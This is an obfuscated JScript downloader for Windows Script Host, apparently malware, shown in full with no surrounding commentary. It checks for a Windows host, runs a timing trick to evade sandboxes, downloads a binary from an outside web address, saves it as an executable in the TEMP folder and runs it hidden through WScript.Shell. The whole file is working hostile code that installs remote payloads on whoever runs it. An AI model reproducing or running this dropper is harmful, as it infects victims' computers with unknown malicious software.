var _F0 = false;
var _G = "CreateObject";
var _N = function _PB() {return WScript[_G]("WScript"+".Shell");}(), _D = 11;
var _I = "MSXML2.XMLHTTP";
var _AH = 2123213;
var _LI = 0;
function _E(_F){_N["Run"](_F, _LI, _LI);};
function _AN(){return _I + "";};
function _Y(_R, _BI){_LI = _LI * 1; return _R - _BI;};
function _CU(){return _G;};
/*@cc_on
  @if (@_win32 || @_win64)
    _F0 = true;
  @end
@*/
if (_F0)
{
var _Q = "";
function _FS(){return 22;};
var _ZX = 0; var _QD = 0;
function _CD()
{
var _SH = new this["Date"]();
var _UJ = _SH["getUTCMilliseconds"]();
WScript["Sleep"](_FS());
var _SH = new this["Date"]();
var _K = _SH["getUTCMilliseconds"]();
WScript["Sleep"](_FS());
var _SH = new this["Date"]();
var _Q0 = _SH["getUTCMilliseconds"]();
var _ZX = "_P";
_ZX = _Y(_K, _UJ);
var _QD = "_EH";
_QD = _Y(_Q0, _K);
_Q = "open";
return _Y(_ZX, _QD);
}
var _ZO = false;
var _U = false;
for (var _FL = _LI; _FL < _FS() * 1; _FL++){if (_CD() != _LI){
_ZO = true; 
_QD = "31" + 11 * _ZX + _QD; 
_U = true; 
break;
}}
function _XN() {return ((_ZO == true) && (_ZO == _U)) ? 1 : _LI;};
if (_ZO && _XN() && _U){
function _CF() {return _N["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "rRkkVyvDVbLA.ex" + "e";};
 _Y0 = _AN();
 _L0 = WScript[_G](_Y0);
 var _J = 1;
 while (_J){
try {
	if (_J == 1)
	{
		_L0[_Q]("GET", "http://rocketsrange.com/b5ksa", false);
		_L0["send"]();
		_PD = "Sleep";
	}
	WScript[_PD](_FS() + 120); 
	if (_L0["readystate"] < 2 * 2) continue;
	_J = _LI;
	function _C(_S) {var _L = (1, 2, 3, 4, 5, _S); return _L;};
	_GJ = WScript[_CU()]("ADODB.Stream");
	_Y0 = _GJ;
	_Y0[_Q]();
	_Y0["type"] = _C(1);
	_Y0["write"](_L0["ResponseBody"]);
	_GJ["position"] = _C(_LI);
	_Y0["Save" + "ToFile"](_CF(), 2);
	_GJ["cl"+"ose"]();
	_JQ = _CF();
	_E(_JQ);
} catch(_T){};
}
}
}

